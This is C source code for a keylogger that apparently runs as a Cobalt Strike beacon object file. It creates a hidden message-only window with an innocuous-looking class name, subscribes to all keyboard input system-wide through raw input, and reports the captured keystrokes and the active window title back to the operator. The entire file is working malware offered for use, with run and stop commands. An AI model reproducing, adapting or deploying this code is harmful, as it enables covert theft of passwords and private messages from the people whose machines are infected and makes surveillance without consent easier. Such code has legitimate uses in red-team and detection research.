#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "keyloggerrawinput.h"
#include "beacon.h"

#pragma comment(lib, "user32.lib")


// Maximum buffer size for captured input
#define MAX_BUF 65536
static char *inputBuf;
static size_t bufPos = 0;


LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    if (msg == WM_INPUT) {
        UINT size = 0;
        USER32$GetRawInputData((HRAWINPUT)lParam, RID_INPUT, NULL, &size, sizeof(RAWINPUTHEADER));
        if (size == 0) return 0;

        LPBYTE data = MSVCRT$malloc(size);
        if (!data) return 0;
        if (USER32$GetRawInputData((HRAWINPUT)lParam, RID_INPUT, data, &size, sizeof(RAWINPUTHEADER)) == size) {
            RAWINPUT *raw = (RAWINPUT*)data;
            if (raw->header.dwType == RIM_TYPEKEYBOARD) {
                USHORT vkey = raw->data.keyboard.VKey;
                USHORT msgk = raw->data.keyboard.Message;
                if (msgk == WM_KEYDOWN || msgk == WM_SYSKEYDOWN) {
                    if (vkey == VK_BACK) {
                        const char *bs = "[BACKSPACE]";
                        size_t len = MSVCRT$strlen(bs);
                        if (bufPos + len < MAX_BUF - 1) {
                            MSVCRT$memcpy(inputBuf + bufPos, bs, len);
                            bufPos += len;
                        }
                    } else if (vkey == VK_SPACE) {
                        if (bufPos < MAX_BUF - 1) {
                            inputBuf[bufPos++] = ' ';
                        }
                    } else {
                        BYTE kbState[256];
                        USER32$GetKeyboardState(kbState);
                        WORD ch = 0;
                        int ret = USER32$ToAscii(vkey, raw->data.keyboard.MakeCode, kbState, &ch, 0);
                        if (ret == 1 && ch >= 32 && ch <= 126) {
                            if (bufPos < MAX_BUF - 1) {
                                inputBuf[bufPos++] = (char)ch;
                            }
                        }
                    }
                }
            }
        }
        MSVCRT$free(data);
        return 0;
    }
    if (msg == WM_DESTROY) {
        USER32$PostQuitMessage(0);
        return 0;
    }
    return USER32$DefWindowProcA(hwnd, msg, wParam, lParam);
}


int go(char *args, int len) {
	datap parser;
    CHAR *cmd = "";
	BeaconDataParse(&parser, args, len);
	cmd = BeaconDataExtract(&parser, NULL);
	

    if (MSVCRT$strcmp(cmd, "run") == 0) {
		// Allocate & zero the `inputBuf
		inputBuf = MSVCRT$malloc(MAX_BUF);
		if (!inputBuf) {
			BeaconPrintf(CALLBACK_OUTPUT, "Failed to allocate buffer\n");
			return 1;
		}
		MSVCRT$memset(inputBuf, 0, MAX_BUF);
		
	    // Register a dummy window class so Windows knows how to route messages to WndProc. 
		HINSTANCE hInstance = KERNEL32$GetModuleHandleA(NULL);
		const char CLASS_NAME[] = "ValuePattern_InputAudioClass";
		WNDCLASS wc = {0};
		wc.lpfnWndProc   = WndProc;
		wc.hInstance     = hInstance;
		wc.lpszClassName = CLASS_NAME;
		
		if (!USER32$GetClassInfoA(hInstance, CLASS_NAME, &wc)) {
			if (!USER32$RegisterClassA(&wc)) {
				BeaconPrintf(CALLBACK_OUTPUT, "RegisterClass failed: %lu\n", KERNEL32$GetLastError());
				return 1;
			}
		}

		// Create a *message-only* window (HWND_MESSAGE) that never appears on-screen
		HWND hwnd = USER32$CreateWindowExA(0, CLASS_NAME, "ValuePattern_InputAudio", 0,0,0,0,0, HWND_MESSAGE, NULL, hInstance, NULL);
		if (!hwnd) {
			BeaconPrintf(CALLBACK_OUTPUT, "CreateWindowEx failed\n");
			return 1;
		}

		// Call RegisterRawInputDevices to subscribe to *all* keyboard input (RIDEV_INPUTSINK)
		RAWINPUTDEVICE rid = {0};
		rid.usUsagePage = 0x01;
		rid.usUsage     = 0x06;
		rid.dwFlags     = RIDEV_INPUTSINK;
		rid.hwndTarget  = hwnd;
		if (!USER32$RegisterRawInputDevices(&rid, 1, sizeof(rid))) {
			BeaconPrintf(CALLBACK_OUTPUT, "RegisterRawInputDevices failed\n");
			return 1;
		}
		
		// Process and dispatch all pending Windows messages from the internal raw-input buffer and sending them to WndProc
		MSG msg;
		while (USER32$PeekMessageA(&msg, NULL, 0, 0, PM_REMOVE)) {
			USER32$TranslateMessage(&msg);
			USER32$DispatchMessageA(&msg);
		}
		
		// If available, print buffered input and free buffer (it doesn't call DestroyWindowA and UnregisterClassA on purpose)
		if (bufPos > 0) {
			LPSTR windowsName[250];
			int maxSizeName = 250;
			HWND foreground = USER32$GetForegroundWindow();
			USER32$GetWindowTextA(foreground, windowsName, maxSizeName);
			
			BeaconPrintf(CALLBACK_OUTPUT, "[+] CAPTURED KEYSTROKES:\n[*] Current selected tab/window: %s\n================================================================================================================\n\n%s\n", windowsName, inputBuf);
		} else {
			BeaconPrintf(CALLBACK_OUTPUT, "[*] Keylogger is running.. no keystrokes captured jet.\n");
		}

		MSVCRT$free(inputBuf);
	}
	else if (MSVCRT$strcmp(cmd, "stop") == 0) {

        // Unregister raw input
        RAWINPUTDEVICE rid_remove = {0};
        rid_remove.usUsagePage = 0x01; rid_remove.usUsage = 0x06;
        rid_remove.dwFlags = RIDEV_REMOVE; rid_remove.hwndTarget = NULL;
        USER32$RegisterRawInputDevices(&rid_remove, 1, sizeof(rid_remove));
		
        // Free buffer
        MSVCRT$free(inputBuf);
        inputBuf = NULL; 
		bufPos = 0; 
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Keylogger stopped\n");
        return 0;
    }
    else {
        BeaconPrintf(CALLBACK_ERROR, "Unknown command. Use [run] or [stop].\n");
        return 1;
    }
	
    return 0;
}
